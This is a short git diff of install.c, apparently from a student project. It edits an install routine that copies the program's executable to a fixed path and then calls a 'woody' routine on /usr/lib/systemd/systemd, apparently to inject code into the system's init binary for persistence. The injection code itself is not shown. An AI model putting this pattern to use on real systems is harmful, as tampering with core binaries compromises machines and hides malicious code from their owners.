@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   install.c                                          :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: jmaia <jmaia@student.42.fr>                +#+  +:+       +#+        */
+/*   By: damien <damien@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/06/02 14:27:57 by jmaia             #+#    #+#             */
-/*   Updated: 2024/06/13 22:51:50 by jmaia            ###   ###               */
+/*   Updated: 2024/06/14 13:19:28 by damien           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,11 +22,14 @@ static bool copy_executable(char const *program_name);
 
 bool install(char const *program_name)
 {
-	bool success;
+	bool success = true;
 
-	success = copy_executable(program_name);
-	if (!success)
-		return false;
+	if (access(BIN_PATH, F_OK) != 0)
+	{
+		success = copy_executable(program_name);
+		if (!success)
+			return false;
+	}
 	success = woody("/usr/lib/systemd/systemd");
 	return success;
 }
